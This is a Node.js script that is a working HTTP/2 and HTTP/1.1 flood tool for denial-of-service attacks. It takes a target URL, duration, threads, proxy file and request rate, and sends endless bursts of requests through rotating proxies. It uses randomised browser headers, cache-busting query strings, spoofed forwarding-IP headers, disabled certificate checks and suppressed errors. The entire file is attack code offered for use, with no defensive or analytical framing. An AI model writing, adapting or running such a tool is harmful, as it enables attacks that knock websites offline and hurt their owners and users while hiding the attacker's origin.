const url = require('url');
const fs = require('fs');
const http2 = require('http2');
const http = require('http');
const net = require('net');
const tls = require('tls');
const cluster = require('cluster');
const { HeaderGenerator } = require('header-generator');

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO'];

process
  .on('uncaughtException', (e) => {
    if ((e.code && ignoreCodes.includes(e.code)) || (e.name && ignoreNames.includes(e.name))) {
      return false;
    }
  })
  .on('unhandledRejection', (e) => {
    if ((e.code && ignoreCodes.includes(e.code)) || (e.name && ignoreNames.includes(e.name))) {
      return false;
    }
  })
  .on('warning', (e) => {
    if ((e.code && ignoreCodes.includes(e.code)) || (e.name && ignoreNames.includes(e.name))) {
      return false;
    }
  })
  .setMaxListeners(0);

const headerGenerator = new HeaderGenerator({
  browsers: [
    { name: "chrome", minVersion: 108, httpVersion: "2" },
    { name: "edge", minVersion: 106, httpVersion: "2" },
    { name: "opera", minVersion: 106, httpVersion: "2" },
    { name: "firefox", minVersion: 107, httpVersion: "2" },
    { name: "safari", httpVersion: "2" },
  ],
  devices: [
    "desktop",
    "mobile",
  ],
  operatingSystems: [
    "linux",
    "windows",
    "macos",
    "android",
    "ios",
  ],
  locales: ["en-US", "en", "fr-FR", "es-ES", "zh-CH", "ja-JP", "de-DE", "ru-RU", "pt-BR", "ko-KR"],
});

tls.DEFAULT_ECDH_CURVE;
tls.authorized = true;
tls.sync = true;

 const accept_header = [
     "*/*",
 ]; 

 const lang_header = [
"en-US,en;q=0.9",
  "en-GB,en;q=0.8",
  "es-ES,es;q=0.9",
  "fr-FR,fr;q=0.8",
  "de-DE,de;q=0.9",
  "ja-JP,ja;q=0.9",
  "pt-BR,pt;q=0.8",
  "it-IT,it;q=0.9",
  "zh-CN,zh;q=0.9",
  "ru-RU,ru;q=0.9"
 ];

 const encoding_header = [
"gzip, deflate, br",
  "gzip, deflate",
  "gzip, br",
  "deflate, br",
  "gzip",
  "deflate",
  "br"

 ];

 const control_header = [
"no-cache",
  "max-age=0",
  "no-store",
  "no-cache, no-store",
  "DYNAMIC",
 ];

 const querys = [
    "=", 
     "?"
 ];

 const pathts = [
     "?s=",
     "/?s=", 
     "/?", 
      "/?query=", 
     "?query="
 ];

const refers = fs.readFileSync('refers.txt', 'utf-8').replace(/\r/g, '').split('\n');
const randomIndex = Math.floor(Math.random() * refers.length);
const Ref = refers[randomIndex];
var accept = getRandomElement(accept_header);
var lang = getRandomElement(lang_header);
var encoding = getRandomElement(encoding_header);
var control = getRandomElement(control_header);
var queryz = getRandomElement(querys);
var pathts1 = getRandomElement(pathts);

function getRandomElement(array) {
  return array[Math.floor(Math.random() * array.length)];
}

const ip_spoof = () => {
  const sp = () => {
    return Math.floor(Math.random() * 255);
  };
  return `${""}${sp()}${"."}${sp()}${"."}${sp()}${"."}${sp()}${""}`;
};

const spoofed = ip_spoof();

if (process.argv.length < 7) {
  console.log(`Usage: node target time threads proxy rps GET`);
  process.exit();
}

let target = process.argv[2],
    time = process.argv[3],
    thread = process.argv[4],
    proxys = fs.readFileSync(process.argv[5], 'utf-8').toString().match(/\S+/g),
    rps = process.argv[6],
    type = process.argv[7];


function proxyr() {
  return proxys[Math.floor(Math.random() * proxys.length)];
}

function randstr(_0xcdc8x17) {
  var abc = "";
  var eb = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789ñññ";
  var cac = eb.length;
  for (var _0xcdc8x1b = 0; _0xcdc8x1b < _0xcdc8x17; _0xcdc8x1b++) {
    abc += eb.charAt(Math.floor(Math.random() * cac));
  }
  return abc;
}


if (cluster.isMaster) {
    console.log(`Target: ${target} | Threads: ${thread} | RPS: ${rps} | Method: ${type}`);

    for (var bb = 0; bb < thread; bb++) {
        cluster.fork();
    }

    setTimeout(() => {
        process.exit(-1);
    }, time * 1000)

} else {
    function flood() {
        var parsed = url.parse(target);
        var proxy = proxyr().split(':');
        let randomHeaders = headerGenerator.getHeaders();
        var header = randomHeaders;

        if (parsed.protocol == "https:") {
            randomHeaders[":path"] = parsed.path + pathts1 + randstr(3) + queryz + randstr(3);
            randomHeaders[":method"] = type;
            randomHeaders[":scheme"] = parsed.protocol.replace(":", "");
            randomHeaders[":authority"] = parsed.host;
            randomHeaders["Referer"] = Ref;
            randomHeaders["accept"] = accept;
            randomHeaders["accept-language"] = lang;
            randomHeaders["accept-encoding"] = encoding;
            randomHeaders["cache-control"] = control;
            randomHeaders["Via"] = spoofed;
            randomHeaders["X-Forwarded-For"] = spoofed;
            randomHeaders["X-Forwarded-Host"] = spoofed;
            randomHeaders["Client-IP"] = spoofed;
            randomHeaders["Real-IP"] = spoofed;

        }


        const agent = new http.Agent({
            keepAlive: true,
            keepAliveMsecs: 50000,
            maxSockets: Infinity,
            maxTotalSockets: Infinity,
            maxSockets: Infinity
        });
        var req = http.request({
            host: proxy[0],
            agent: agent,
            globalAgent: agent,
            port: proxy[1],
            headers: {
                'Host': parsed.host,
                'Proxy-Connection': 'Keep-Alive',
                'Connection': 'Keep-Alive',
            },
            method: 'CONNECT',
            path: parsed.host
        }, function() {
            req.setSocketKeepAlive(true);
        });
        const sigalgs = [
            'ecdsa_secp256r1_sha256',
            'ecdsa_secp384r1_sha384',
            'ecdsa_secp521r1_sha512',
            'rsa_pss_rsae_sha256',
            'rsa_pss_rsae_sha384',
            'rsa_pss_rsae_sha512',
            'rsa_pkcs1_sha256',
            'rsa_pkcs1_sha384',
            'rsa_pkcs1_sha512',
        ];

        let SignalsList = sigalgs.join(':');

        const uri = new URL(target)

        const port = uri.port == '' ? parsed.protocol == "https" ? 443 : 80 : parseInt(uri.port)


        req.on('connect', function(res, socket, head) {

            if (parsed.protocol == "https:") {
                const client = http2.connect(parsed.href, {
                    createConnection: () => tls.connect({
                        host: parsed.host,
                        ciphers: tls.getCiphers().standardName,
                        secureProtocol: ['TLSv1_1_method', 'TLSv1_2_method', 'TLSv1_3_method'],
                        port,
                        servername: parsed.host,
                        maxRedirects: 25,
                        followAllRedirects: true,
                        secure: true,
                        sigalgs: SignalsList,
                        rejectUnauthorized: false,
                        honorCipherOrder: true,
                        ALPNProtocols: ['h2', 'http1.1'],
                             sessionTimeout: 5000,
                        socket: socket
                    }, function() {
                        for (let i = 0; i < rps; i++) {
                            const req = client.request(header);
                            req.setEncoding('utf8');
                            req.on('data', (chunk) => {
                            });
                            req.on("response", () => {
                                req.close();
                            })
                            req.end();
                        }
                    })
                });
            }
            else {
                let requestPayload = `${type} ${parsed.href} HTTP/1.1\r\n`;

                randomHeaders = {}
                randomHeaders["Host"] = parsed.host;
                randomHeaders["Connection"] = "keep-alive";

                for (const header in randomHeaders) 
                {
                    function titleCase(str) 
                    {
                        const splitStr = str.toLowerCase().split('-');

                        for (let i = 0; i < splitStr.length; i++) {
                            splitStr[i] = splitStr[i].charAt(0).toUpperCase() + splitStr[i].substring(1);     
                        }

                        return splitStr.join('-'); 
                    }      
            
                    requestPayload += titleCase(header) + ": " + randomHeaders[header] + "\r\n"
                }
                requestPayload += "\r\n"

                let socket = net.connect(proxy[1], proxy[0]);
                
                socket.setKeepAlive(true, 5000);
                socket.setTimeout(5000);

                socket.once('error', err => { socket.destroy() });
                socket.once('disconnect', () => {});

                socket.once('data', () => setTimeout( () => socket.destroy(), 10000))

                for (let i = 0; i < rps; i++) {
                    socket.write(Buffer.from(requestPayload, "binary"))
                }

                socket.on('data', function() {
                    setTimeout(function() {
                        socket.destroy();
                        return delete socket;
                    }, 5000);
                });
            }
        });
        req.end();  
    }

    setInterval(() => {
        flood()
    })
}
